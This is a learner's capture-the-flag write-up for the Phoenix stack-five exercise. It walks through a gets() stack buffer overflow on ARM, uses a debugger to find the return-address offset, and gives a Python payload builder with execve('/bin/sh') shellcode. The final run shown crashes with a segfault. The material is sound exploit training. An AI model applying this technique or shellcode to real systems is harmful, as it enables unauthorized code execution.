# Phoenix Stack5
### Result
### Learning
This challenge started with a question:

> As opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.

You had to overwrite the `return address` and jump to self-written / downloaded `shellcode`.

Overwriting the `return address` and running `shellcode` was simpler on `stack5.c`, compared to a modern compiled C program.  It was not protected with `ASLR`, `Stack Guards` and it had an `executable stack`.

The `Buffer Overflow` was possible due to the code using the vulnerable C API `gets()`.

##### Run the code
```
$ ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAA
```  
##### Symbols
```
// cut down for brevity
[0x000103b4]> is~FUNC
072 0x000004e8 0x000104e8 GLOBAL   FUNC   36 start_level
079 0x0000050c 0x0001050c GLOBAL   FUNC   52 main
002 0x00000378 0x00010378 GLOBAL   FUNC   16 imp.gets
003 0x00000384 0x00010384 GLOBAL   FUNC   16 imp.puts
```
### Calculate buffer to overflow
```
/ (fcn) sym.start_level 36
|           0x000104f0      80d04de2       sub sp, sp, 0x80   <-- space for local var
|           0x000104f4      84304be2       sub r3, fp, 0x84   <-- same as above
|           0x000104f8      0300a0e1       mov r0, r3                  ; char *s
|           0x000104fc      9dffffeb       bl sym.imp.gets             ; char *gets(char *s)
```
Bytes allocated setting up the `start_level Stack` suggested a `128 buffer` and a `4 byte pointer`.  I guessed the `4 byte pointer` was the address of the buffer, based on what Radare2 showed.

### Debugger Analysis
##### Verify the Buffer size
```
gef> b *start_level + 24      <-- // breakpoint on first instruction after gets()

gef> disas start_level
Dump of assembler code for function start_level:
   0x000104e8 <+0>:	push	{r11, lr}
   0x000104ec <+4>:	add	r11, sp, #4
   0x000104f0 <+8>:	sub	sp, sp, #128	; 0x80.      <-- re-affirm size of buffer
   0x000104f4 <+12>:	sub	r3, r11, #132	; 0x84
   0x000104f8 <+16>:	mov	r0, r3
   0x000104fc <+20>:	bl	0x10378 <gets@plt>
=> 0x00010500 <+24>:	nop			; (mov r0, r0)
   0x00010504 <+28>:	sub	sp, r11, #4
   0x00010508 <+32>:	pop	{r11, pc}
```
You could read the disassembled code to see the Char buffer size.
```
gef> p/u 0x80
$5 = 128
```
##### Find the Return Address in the Stack
```
gef> disas main
...
   0x00010528 <+28>:	bl	0x104e8 <start_level>
   0x0001052c <+32>:	mov	r3, #0     <-- the return address
```
Run the code:
```
gef> r < AAAA

gef> find $sp, +200,0x0001052c
0xfffefd74
1 pattern found.

gef> p/u 0xfffefd74 - 0xfffefcf0
$11 = 132

$sp  : 0xfffefcf0
$r11 : 0xfffefd74

// alternative way..

gef> p/u $fp - $sp      
$1 = 132
```
##### Overwrite the Return Address
```
gef> r <<< $(python -c 'print "A"*132 + "\x42\x42\x42\x42"')

$ cat ~/129chars | wc -c
129     <- due to a \n not being removed

$ cat ~/128chars | ./stack-five
Program received signal SIGSEGV, Segmentation fault.

$ cat ~/128chars | wc -c
128

cat ~/128chars | ./stack-five
Illegal instruction
```
##### Write / find shellcode
I practiced writing my own shellcode:
https://github.com/rustymagnet3000/bits_bytes_playground/blob/master/example_28b_C_execve_shellcode.md

##### Construct Payload
```
#!/usr/bin/env python

import sys

location_return_addr = 132
l_nop_padding = 60
shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78"

if __name__ == "__main__":
    padded_shellcode = "\x90" * l_nop_padding
    padded_shellcode += shellcode
    r_nop_padding = location_return_addr - len(padded_shellcode)
    padded_shellcode += "\x90" * r_nop_padding

    if (len(padded_shellcode)) != location_return_addr:
        print("Padding error")
        exit()

    for byte in padded_shellcode:
        sys.stdout.write("\\x" + byte.encode("hex"))
    print ""
```
##### Construct Payload
```
python payload.py > payload
```
On my ARM-emulating terminal it did not.I kept hitting:

`UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-59`

That is why I moved to using `byte.encode`.

##### The Payload
```
$ cat payload
\x90\x90\x90\......<shellcode in here. Removed for brevity>........\x90\x90\x90
```
##### Run Payload
```
cat ~/payload | ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
```
##### Source code
```
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```
